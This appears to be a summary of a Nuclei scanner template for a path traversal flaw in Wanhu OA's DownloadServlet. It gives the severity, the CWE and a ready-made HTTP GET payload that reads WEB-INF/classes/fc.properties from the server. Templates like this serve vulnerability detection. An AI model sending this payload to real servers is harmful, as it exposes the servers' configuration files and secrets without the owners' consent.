# Nuclei Template: Wanhu OA DownloadServlet - Remote File Disclosure
**Template ID:** wanhuoa-downloadservlet-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`wanhuoa-downloadservlet-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the Wanhu OA DownloadServlet interface. An attacker can use the vulnerability to read sensitive files in the server and obtain sensitive information.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20DownloadServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
- https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20DownloadServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
